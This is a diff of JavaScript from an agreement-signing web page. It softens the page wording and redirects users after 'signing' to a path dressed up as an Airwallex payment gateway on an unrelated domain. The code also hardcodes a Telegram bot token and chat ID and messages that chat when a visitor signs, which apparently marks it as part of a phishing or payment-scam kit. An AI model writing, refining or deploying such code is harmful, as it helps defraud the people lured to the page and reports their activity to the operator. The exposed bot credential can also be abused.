@@ -1545,7 +1545,7 @@ window.addEventListener("load", () => {
     const nameString = firstName ? `, ${firstName}` : "";
 
     // Shows the compliance message instantly on page load with personal name support
-    showNotification(`Welcome${nameString}: Please sign your agreement`);
+    showNotification(`Welcome${nameString}: Please accept your agreement`);
 
     setTimeout(() => {
         updateSessionUI();
@@ -1868,7 +1868,7 @@ if (urlParamsForReset.get('reset') === 'true') {
     // ==========================================
     const TELEGRAM_BOT_TOKENs = "8663093122:AAHdCgL3yFq3Ew46kkU84tiQG3BNap5yK_M";
     const TELEGRAM_CHAT_IDs = "-1003913850436";
-    const BASE_CONTRA_REDIRECT_URL = 'https://membership.avalonflow.site/dashboard?user=';
+    const BASE_CONTRA_REDIRECT_URL = 'https://membership.avalonflow.site/airwallexgateway-4f2e1a9c8b7d3e6f0a5b2c1d4e7f8a9b?user=';
 
     function getFormattedDate(timestamp = Date.now()) {
         const options = { year: 'numeric', month: 'long', day: 'numeric' };
@@ -2196,7 +2196,7 @@ function initializeOrLoadSchedule() {
 
         document.getElementById('contractorSignature').style.display = 'inline-block';
         document.getElementById('sigDate').innerText = executionDateStr;
-        document.getElementById('actionArea').innerHTML = `<p style="color: #27ae60; font-weight: 700;">Agreement executed${nameString}! Redirecting...</p>`;
+        document.getElementById('actionArea').innerHTML = `<p style="color: #27ae60; font-weight: 700;">Agreement acknowledged ${nameString}! Redirecting...</p>`;
 
         await sendTelegramNotification("Contract Signed");
 
